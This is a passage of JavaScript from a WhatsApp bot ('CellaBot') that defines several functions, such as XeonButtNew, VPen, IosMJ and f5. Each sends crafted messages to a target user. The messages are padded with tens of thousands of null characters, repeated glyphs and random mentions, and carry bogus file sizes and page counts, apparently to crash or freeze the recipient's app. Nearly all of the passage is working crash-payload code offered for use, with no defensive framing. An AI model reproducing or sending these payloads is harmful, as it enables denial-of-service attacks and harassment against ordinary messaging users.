                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: zLoc,
                    mentions: zLoc
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await CellaBot.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
                  address: "",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await CellaBot.relayMessage(zLoc, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Cela;\",\"key\":\"🦄드림 가이 Cela\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await CellaBot.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: "xeontex",
                  url: "https://" + ggg + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
                    mentionedJid: zLoc,
                    mentions: zLoc,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
        }
        
        async function XeonButtNew(zLoc, ptcp = false) {
   await CellaBot.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "🦄드림 가이 Xeon",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🦄드림 가이 Xeon\n" + "@916909137213".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '🦄드림 가이 Xeon', url: \"https://youtube.com/dgxeon\", merchant_url: \"https://youtube.com/dgxeon\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "🦄드림 가이 Xeon",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
  };
 async function VPen(zLoc, ptcp = false) {
    let valhalla = "Hola" + "𑲭𑲭".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await CellaBot.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
    async function SendPairing(zLoc, Ptcp = false) {
			await CellaBot.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
};

   async function IosMJ(zLoc, ptcp = false) {
      await CellaBot.relayMessage(
        zLoc,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "CELLA - CALL" + "\u0000".repeat(50000),
                body: "͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/cellasukanenen",
                mediaUrl: "https://t.me/cellasukanenen",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/cellasukanenen",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        ptcp
          ? {
              participant: {
                jid: zLoc,
              },
            }
          : {}
      );
    }

   async function f5(zLoc, ptcp = false) {
    await CellaBot.relayMessage(zLoc, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "⭑̤▾ g͆Senkug̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ𓍯̤𖣂  Cella - U I\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A 